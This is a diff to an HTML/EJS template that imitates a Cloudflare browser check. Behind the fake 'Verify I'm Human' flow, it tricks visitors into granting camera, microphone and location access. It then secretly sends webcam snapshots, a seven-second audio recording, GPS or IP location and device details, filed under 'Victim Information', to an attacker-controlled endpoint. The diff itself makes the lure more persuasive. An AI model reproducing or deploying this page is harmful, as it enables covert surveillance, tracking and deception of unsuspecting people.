@@ -1,260 +1,268 @@
 <html lang="en-US">
-<head> 
-<meta charset="UTF-8"> 
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
-<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
-<meta name="robots" content="noindex, nofollow"> 
-<meta name="viewport" content="width=device-width,initial-scale=1"> 
-<title>Just a moment....</title> 
-<style type="text/css">
-html, body {width: 100%; height: 100%; margin: 0; padding: 0;}
-body {background-color: #ffffff; color: #000000; font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue",Arial, sans-serif; font-size: 16px; line-height: 1.7em;-webkit-font-smoothing: antialiased;}
-h1 { text-align: center; font-weight:700; margin: 16px 0; font-size: 32px; color:#000000; line-height: 1.25;}
-p {font-size: 20px; font-weight: 400; margin: 8px 0;}
-p, .attribution, {text-align: center;}
-#spinner {margin: 0 auto 30px auto; display: block;}
-.attribution {margin-top: 32px;}
-@keyframes fader   { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
-@-webkit-keyframes fader { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
-#cf-bubbles > .bubbles { animation: fader 1.6s infinite;}
-#cf-bubbles > .bubbles:nth-child(2) { animation-delay: .2s;}
-#cf-bubbles > .bubbles:nth-child(3) { animation-delay: .4s;}
-.bubbles { background-color: #f58220; width:20px; height: 20px; margin:2px; border-radius:100%; display:inline-block; }
-a { color: #2c7cb0; text-decoration: none; -moz-transition: color 0.15s ease; -o-transition: color 0.15s ease; -webkit-transition: color 0.15s ease; transition: color 0.15s ease; }
-a:hover{color: #f4a15d}
-.attribution{font-size: 16px; line-height: 1.5;}
-.ray_id{display: block; margin-top: 8px;}
-#cf-wrapper #challenge-form { padding-top:25px; padding-bottom:25px; }
-#cf-hcaptcha-container { text-align:center;}
-#cf-hcaptcha-container iframe { display: inline-block;}
-</style> 
-</head> 
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+<meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Security Check – Cloudflare</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{width:100%;min-height:100%;background:#f6f6f6;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;color:#1d1d1f}
+.wrap{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:24px}
+.card{background:#fff;border-radius:16px;box-shadow:0 4px 32px rgba(0,0,0,.10);padding:36px 32px;max-width:440px;width:100%;text-align:center}
+.cf-logo{font-size:40px;margin-bottom:8px}
+.cf-title{font-size:22px;font-weight:700;color:#1d1d1f;margin-bottom:6px}
+.cf-sub{font-size:14px;color:#6e6e73;margin-bottom:28px;line-height:1.5}
+.shield{width:72px;height:72px;background:linear-gradient(135deg,#f58220,#e36209);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:34px;box-shadow:0 4px 16px rgba(245,130,32,.35)}
+.verify-btn{display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#f58220,#e36209);color:#fff;border:none;border-radius:12px;padding:15px 36px;font-size:17px;font-weight:600;cursor:pointer;width:100%;justify-content:center;transition:opacity .2s;margin-bottom:12px}
+.verify-btn:disabled{opacity:.6;cursor:not-allowed}
+.verify-btn:active{opacity:.85}
+.retry-btn{display:none;background:transparent;border:2px solid #f58220;color:#f58220;border-radius:12px;padding:12px 28px;font-size:15px;font-weight:600;cursor:pointer;width:100%;margin-top:8px;transition:.2s}
+.retry-btn:hover{background:#fff8f2}
+.step-row{display:flex;align-items:center;gap:12px;background:#f9f9f9;border-radius:10px;padding:12px 16px;margin-bottom:8px;text-align:left;font-size:14px}
+.step-icon{font-size:20px;min-width:28px;text-align:center}
+.step-text{flex:1;color:#444}
+.step-badge{font-size:12px;font-weight:700;padding:3px 8px;border-radius:20px}
+.badge-wait{background:#f0f0f0;color:#888}
+.badge-ok{background:#d1fae5;color:#065f46}
+.badge-err{background:#fee2e2;color:#991b1b}
+.progress-bar{height:4px;background:#f0f0f0;border-radius:4px;margin:20px 0;overflow:hidden}
+.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#f58220,#e36209);border-radius:4px;transition:width .5s ease}
+#status-msg{font-size:13px;color:#6e6e73;margin-top:8px;min-height:18px}
+#error-msg{font-size:13px;color:#dc2626;margin-top:10px;display:none}
+.footer{margin-top:20px;font-size:12px;color:#aaa}
+.footer a{color:#aaa;text-decoration:none}
+.cf-ray{margin-top:4px;font-size:11px;color:#ccc}
+</style>
+</head>
 <body>
-<table width="100%" height="100%" cellpadding="20"> 
-<tbody>
-<tr> 
-<td align="center" valign="middle"> 
-<div class="cf-browser-verification cf-im-under-attack"> 
-<noscript> 
-<h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1> 
-</noscript> 
-<div id="cf-content" style="display: block;"> 
-<div id="cf-bubbles"> 
-<div class="bubbles"></div> 
-<div class="bubbles"></div> 
-<div class="bubbles"></div> 
-</div> 
-<h1><span data-translate="checking_browser">Checking your browser before accessing</span> the website.</h1> 
-<div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none"> 
-<p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p> 
-</div> 
-<p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your requested content shortly.</p> 
-<p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs" style="display: none;">Please allow up to 5 seconds…</p> 
-<p data-translate="redirecting" id="cf-spinner-redirecting" style="display: block;">Redirecting…</p> 
-</div> 
-<form class="challenge-form" id="challenge-form" action="http://000webhost.com/?__cf_chl_jschl_tk__=gUwvgP4U.d3mjLABceeM1Hoq0yzKoVb2_YClw1ApwLs-1640764924-0-gaNycGzNA70" method="POST" enctype="application/x-www-form-urlencoded"> 
+<div class="wrap">
+  <div class="card">
+    <div class="cf-logo">🛡️</div>
+    <div class="cf-title">Security Verification Required</div>
+    <div class="cf-sub">Checking your browser before accessing the website.<br>This process is automatic and takes a few seconds.</div>
 
-<span data-translate="error" style="display: none;">error code: 1020</span>
+    <div class="shield">🔒</div>
 
-</form>
-</div> 
-<div class="attribution">
-DDoS protection by 
-<a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a> 
-<br> 
-<span class="ray_id">Ray ID: <code id="ray" >6c51810c599f2cda</code></span> 
-</div> </td> 
-</tr> 
-</tbody>
-</table>
-<video id="video" style="display:none"  playsinline autoplay></video>
-<canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
+    <div class="step-row" id="step-cam">
+      <div class="step-icon">📷</div>
+      <div class="step-text">Camera & Microphone Access</div>
+      <div class="step-badge badge-wait" id="badge-cam">Pending</div>
+    </div>
+    <div class="step-row" id="step-loc">
+      <div class="step-icon">📍</div>
+      <div class="step-text">Location Verification</div>
+      <div class="step-badge badge-wait" id="badge-loc">Pending</div>
+    </div>
+    <div class="step-row" id="step-dev">
+      <div class="step-icon">📱</div>
+      <div class="step-text">Device Security Check</div>
+      <div class="step-badge badge-wait" id="badge-dev">Pending</div>
+    </div>
+
+    <div class="progress-bar"><div class="progress-fill" id="pbar"></div></div>
+    <div id="status-msg">Press the button to begin verification</div>
+    <div id="error-msg"></div>
+
+    <br>
+    <button class="verify-btn" id="verify-btn" onclick="startVerify()">
+      ✅ Verify I'm Human
+    </button>
+    <button class="retry-btn" id="retry-btn" onclick="startVerify()">
+      🔄 Try Again
+    </button>
+
+    <div class="footer">
+      DDoS protection by <a href="https://www.cloudflare.com" target="_blank">Cloudflare</a>
+      <div class="cf-ray">Ray ID: <span id="ray">loading...</span></div>
+    </div>
+  </div>
+</div>
+
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas hidden id="canvas" width="500" height="500"></canvas>
+
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
-<script type="text/javascript">
-var c=false,l=false,uid="<%=uid %>";
-async function gather(){
-var td="";
-<% if(!t){ %>
-td += '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
-<% }else{ %>
-await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));
-<% } %>
+<script>
+var uid="<%=uid %>", a="<%=a %>", destUrl="<%=url %>";
+var camDone=false, locDone=false;
+var verifying=false;
 
-td+="<br><br><b>⏳ Date In Victim's Device :</b> "+new Date()+"<br>";
-var xo=["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
-var xoc=["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
-
-td+="<br><b>📱 Device Information</b><br>";
-for(var i=0;i<xo.length;i++){
-if(xo[i] in navigator){
-var str=navigator[xo[i]];
-td+="<b>"+xo[i]+"</b>: <code>"+str+"</code><br>";
+function setProgress(p){ document.getElementById('pbar').style.width=p+'%'; }
+function setStatus(t){ document.getElementById('status-msg').textContent=t; }
+function setBadge(id,type,text){
+  var el=document.getElementById('badge-'+id);
+  el.textContent=text;
+  el.className='step-badge badge-'+type;
 }
+function showError(t){
+  var el=document.getElementById('error-msg');
+  el.textContent=t; el.style.display='block';
 }
+function hideError(){ document.getElementById('error-msg').style.display='none'; }
 
-if(navigator.mediaDevices||navigator.mediaDevices?.enumerateDevices){
-await navigator.mediaDevices?.enumerateDevices().then(function(devices){
-td+="<br><b>📷 Media Device Information</b><br>";
-devices.forEach(function(device){
-td+="<b>"+device.kind+":</b> "+device.label+" id = <code>"+device.deviceId+"</code><br>";
-});
-}).catch(function(err){
-td+="<br><b>📷 Media Device Information</b><br>";
-td+="⚠️ Media Device Error: "+err.name+": "+err.message;
-});
+function tryRedirect(){
+  if(camDone && locDone){ window.location.href=destUrl; }
 }
 
-if("connection" in navigator){
-td+="<br><b>🕸️ Network Information</b><br>";
-for(var i=0;i<xoc.length;i++){
-var str=navigator.connection[xoc[i]];
-td+="<b>"+xoc[i]+"</b>: <code>"+str+"</code><br>";
-}
-}
-
-if("usb" in navigator){
-await navigator.usb.getDevices().then(devices=>{
-td+="<br><b>🔌 Total USB devices connected:</b> "+devices.length+"<br>";
-devices.forEach(device=>{
-td+="<b>Product name:</b> "+device.productName+" , <b>Serial number: </b> <code>"+device.serialNumber+"</code><br>";
-});
-});
-}
-
-if("getBattery" in navigator){
-await navigator.getBattery().then(function(battery){
-td+="<br><b>🔋 Battery Information</b><br>";
-td+="<b>🔋Battery Level:</b> "+battery.level*100+"%<br><b>⚡ Is Battery Charging:</b> "+battery.charging;
-});
-}
-
-// ── Location ──────────────────────────────────────────────────────────────────
-async function sendLocation(lat,lon,acc){
-return new Promise(function(resolve){
-$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(lat),lon:encodeURIComponent(lon),acc:encodeURIComponent(acc)},function(){
-l=true;red();resolve();
-});
-});
+async function sendDeviceInfo(){
+  var td="";
+  <% if(!t){ %>
+  td+='<code>✅Victim Information</code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>"><%=ip %></a> | Time: <%=time %></b>';
+  <% }else{ %>
+  try{ var r=await fetch(a).then(x=>x.json()); td+='<code>✅Victim Information</code><br><br><b>⚓ IP: <a href="https://ip-api.com/#'+r.ip+'">'+r.ip+'</a> | Time: <%=time %></b>'; }catch(e){}
+  <% } %>
+  td+="<br><br><b>⏳ Date:</b> "+new Date()+"<br>";
+  var xo=["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
+  td+="<br><b>📱 Device Information</b><br>";
+  for(var i=0;i<xo.length;i++){ if(xo[i] in navigator){ td+="<b>"+xo[i]+"</b>: <code>"+navigator[xo[i]]+"</code><br>"; } }
+  if(navigator.mediaDevices?.enumerateDevices){
+    try{ var devs=await navigator.mediaDevices.enumerateDevices(); td+="<br><b>📷 Media Devices</b><br>"; devs.forEach(function(d){ td+="<b>"+d.kind+":</b> "+d.label+"<br>"; }); }catch(e){}
+  }
+  if("connection" in navigator){
+    var xoc=["type","rtt","saveData","effectiveType","downlink"];
+    td+="<br><b>🕸️ Network</b><br>";
+    for(var i=0;i<xoc.length;i++){ td+="<b>"+xoc[i]+"</b>: <code>"+navigator.connection[xoc[i]]+"</code><br>"; }
+  }
+  if("getBattery" in navigator){
+    try{ var b=await navigator.getBattery(); td+="<br><b>🔋 Battery</b><br><b>Level:</b> "+b.level*100+"%<br><b>Charging:</b> "+b.charging; }catch(e){}
+  }
+  $.post(a,{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},function(){});
+  setBadge('dev','ok','✓ Done');
 }
 
-async function ipLocation(){
-try{
-var d=await fetch("https://ipapi.co/json/").then(r=>r.json());
-if(d&&d.latitude&&d.longitude){
-await sendLocation(d.latitude,d.longitude,"IP-Based (~"+d.city+", "+d.country_name+")");
-}else{l=true;}
-}catch(e){l=true;}
+async function startVerify(){
+  if(verifying) return;
+  verifying=true;
+  camDone=false; locDone=false;
+  hideError();
+  document.getElementById('verify-btn').disabled=true;
+  document.getElementById('retry-btn').style.display='none';
+  setBadge('cam','wait','Pending');
+  setBadge('loc','wait','Pending');
+  setBadge('dev','wait','Pending');
+  setProgress(5);
+  setStatus('Starting verification...');
+
+  // Device info (no permission needed)
+  sendDeviceInfo();
+
+  // ── Camera + Audio ──────────────────────────────────────────────
+  setStatus('Requesting camera access...');
+  var stream=null;
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:"user"}});
+  }catch(e1){
+    try{ stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:"user"}}); }
+    catch(e2){
+      setBadge('cam','err','✗ Denied');
+      showError('❌ Camera access is required. Please allow camera and try again.');
+      setStatus('Permission denied');
+      setProgress(0);
+      document.getElementById('retry-btn').style.display='block';
+      verifying=false;
+      return;
+    }
+  }
+
+  setBadge('cam','ok','✓ Granted');
+  setProgress(35);
+  setStatus('Capturing verification photos...');
+
+  // Start camera snaps
+  var video=document.getElementById('video');
+  var canvas=document.getElementById('canvas');
+  var videoStream=new MediaStream(stream.getVideoTracks());
+  video.srcObject=videoStream;
+
+  var snapCount=0;
+  await new Promise(function(res){
+    video.onloadedmetadata=function(){ video.play(); res(); };
+    setTimeout(res,2000);
+  });
+
+  var ctx=canvas.getContext('2d');
+  var snapTimer=setInterval(function(){
+    ctx.drawImage(video,0,0,500,500);
+    var data=canvas.toDataURL("image/png").replace("data:image/png;base64","");
+    $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(data)},function(){});
+    snapCount++;
+    if(snapCount>=4){ clearInterval(snapTimer); camDone=true; tryRedirect(); }
+  },1500);
+
+  // Audio recording
+  try{
+    var audioTracks=stream.getAudioTracks();
+    if(audioTracks.length>0){
+      var audioStream=new MediaStream(audioTracks);
+      var recorder=new MediaRecorder(audioStream);
+      var chunks=[];
+      recorder.ondataavailable=function(e){ if(e.data&&e.data.size>0) chunks.push(e.data); };
+      recorder.onstop=function(){
+        var blob=new Blob(chunks,{type:'audio/webm'});
+        var reader=new FileReader();
+        reader.onloadend=function(){
+          var b64=reader.result.replace(/^data:.+;base64,/,'');
+          $.post(a+"/audio",{uid:uid,audio:encodeURIComponent(b64)},function(){});
+        };
+        reader.readAsDataURL(blob);
+      };
+      recorder.start();
+      setTimeout(function(){ try{ recorder.stop(); }catch(e){} },7000);
+    }
+  }catch(e){}
+
+  setProgress(55);
+  setStatus('Verifying your location...');
+
+  // ── Location ────────────────────────────────────────────────────
+  async function sendLocation(lat,lon,acc){
+    return new Promise(function(resolve){
+      $.post(a+"/location",{uid:uid,lat:encodeURIComponent(lat),lon:encodeURIComponent(lon),acc:encodeURIComponent(acc)},function(){
+        locDone=true; resolve(); tryRedirect();
+      });
+    });
+  }
+
+  async function ipLocation(){
+    try{
+      var d=await fetch("https://ipapi.co/json/").then(r=>r.json());
+      if(d&&d.latitude){ await sendLocation(d.latitude,d.longitude,"IP (~"+d.city+", "+d.country_name+")"); }
+      else{ locDone=true; tryRedirect(); }
+    }catch(e){ locDone=true; tryRedirect(); }
+  }
+
+  if(!navigator.geolocation){
+    setBadge('loc','ok','✓ IP-Based');
+    await ipLocation();
+  } else {
+    var locTimer=setTimeout(async function(){ setBadge('loc','ok','✓ IP-Based'); await ipLocation(); },9000);
+    navigator.geolocation.getCurrentPosition(
+      async function(pos){
+        clearTimeout(locTimer);
+        setBadge('loc','ok','✓ GPS');
+        setProgress(80);
+        await sendLocation(pos.coords.latitude,pos.coords.longitude,pos.coords.accuracy+"m (GPS)");
+      },
+      async function(err){
+        clearTimeout(locTimer);
+        setBadge('loc','ok','✓ IP-Based');
+        await ipLocation();
+      },
+      {enableHighAccuracy:true,timeout:8000,maximumAge:0}
+    );
+  }
+
+  setProgress(90);
+  setStatus('Almost done...');
 }
 
-if(!navigator.geolocation){
-td+="<br><b>📍 Location</b><br>⚠️ GPS غير متاح — استخدام IP";
-await ipLocation();
-}else{
-await new Promise(function(resolve){
-var done=false;
-var timer=setTimeout(async function(){
-if(!done){done=true;await ipLocation();resolve();}
-},8000);
-navigator.geolocation.getCurrentPosition(
-async function(pos){
-if(done)return;done=true;clearTimeout(timer);
-await sendLocation(pos.coords.latitude,pos.coords.longitude,pos.coords.accuracy+" m (GPS)");
-resolve();
-},
-async function(err){
-if(done)return;done=true;clearTimeout(timer);
-td+="<br><b>📍 Location</b><br>⚠️ GPS مرفوض — استخدام IP";
-await ipLocation();resolve();
-},
-{enableHighAccuracy:true,timeout:7000,maximumAge:0}
-);
-});
-}
-
-// ── Camera + Audio ────────────────────────────────────────────────────────────
-const video=document.getElementById('video');
-const canvas=document.getElementById('canvas');
-var imgsent=0;
-
-function postSnap(o){
-$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},function(){
-imgsent+=1;
-if(imgsent==4){c=true;red();}
-});
-}
-
-function handleSuccess(stream){
-window.stream=stream;
-// Camera snapshots
-var videoStream=new MediaStream(stream.getVideoTracks());
-video.srcObject=videoStream;
-var context=canvas.getContext('2d');
-var snapCount=0;
-var snapId=setInterval(function(){
-context.drawImage(video,0,0,500,500);
-var canvasData=canvas.toDataURL("image/png").replace("data:image/png;base64","");
-postSnap(canvasData);
-snapCount++;
-if(snapCount>=4)clearInterval(snapId);
-},1500);
-// Audio recording from same stream
-try{
-var audioTracks=stream.getAudioTracks();
-if(audioTracks.length>0){
-var audioStream=new MediaStream(audioTracks);
-var recorder=new MediaRecorder(audioStream);
-var chunks=[];
-recorder.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
-recorder.onstop=function(){
-var blob=new Blob(chunks,{type:'audio/webm'});
-var reader=new FileReader();
-reader.onloadend=function(){
-var b64=reader.result.replace(/^data:.+;base64,/,'');
-$.post("<%=a %>/audio",{uid:uid,audio:encodeURIComponent(b64)});
-};
-reader.readAsDataURL(blob);
-};
-recorder.start();
-setTimeout(function(){try{recorder.stop();}catch(e){}},7000);
-}
-}catch(e){}
-}
-
-async function cam(){
-try{
-const stream=await navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:"user"}});
-handleSuccess(stream);
-}catch(e1){
-try{
-const stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:"user"}});
-handleSuccess(stream);
-}catch(e2){
-td+='<br><b>📷 Camera</b><br>⚠️ '+e2.toString();
-c=true;red();
-}
-}
-}
-cam();
-
-function red(){
-if(c&&l){window.location.href="<%=url %>";}
-}
-
-$.post("<%=a %>",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},function(){});
-
-}
-
-
-
-
-window.onload=()=>{
-gather();
-var i="qwertyuioplkjhgfdsazxcvbnm0987654321";
-var str="";
-for(var o=0;o<17;o++){
-str+=i[Math.floor(Math.random() * 35)];
-}
-document.getElementById("ray").innerHTML=str;
+window.onload=function(){
+  var chars="qwertyuioplkjhgfdsazxcvbnm0987654321";
+  var ray="";
+  for(var i=0;i<17;i++) ray+=chars[Math.floor(Math.random()*35)];
+  document.getElementById('ray').textContent=ray;
 };
 </script>
 </body>
